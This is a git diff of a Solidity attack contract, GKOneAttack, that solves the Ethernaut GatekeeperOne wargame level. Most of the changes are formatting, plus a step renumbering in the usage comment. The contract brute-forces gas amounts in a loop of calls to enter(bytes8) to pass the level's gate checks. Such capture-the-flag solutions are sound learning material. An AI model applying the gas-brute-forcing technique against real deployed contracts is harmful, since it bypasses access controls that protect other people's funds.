@@ -13,7 +13,8 @@ Tools needed for this level:
 
 1.- Deploy this contract (GKOneAttack) with Remix using the Injected Web3 environment
 		passing Ethernaut's GatekeeperOne contract address.
-3.- Check if you are entrant:
+
+2.- Check if you are entrant:
 				await contract.entrant()
 */
 
@@ -21,7 +22,6 @@ Tools needed for this level:
 pragma solidity ^0.6.0;
 
 contract GKOneAttack {
-
 	constructor(address GKOneAddr) public {
 		/*-----------Gate three----------*/
 
@@ -34,14 +34,15 @@ contract GKOneAttack {
 
 		/*------------Gate two-----------*/
 
-    for (uint256 i = 0; i < 120; i++) {
+		for (uint256 i = 0; i < 120; i++) {
 			// Using call (vs. an abstract interface) prevents reverts from propagating.
-    	(bool result, ) = GKOneAddr.call{gas:
-    	i + 150 + 8191*3}(abi.encodeWithSignature("enter(bytes8)", key)); 
-      
-			if(result){
-        break;
-      }
-    }
+			(bool result, ) = GKOneAddr.call{gas: i + 150 + 8191 * 3}(
+				abi.encodeWithSignature('enter(bytes8)', key)
+			);
+
+			if (result) {
+				break;
+			}
+		}
 	}
 }
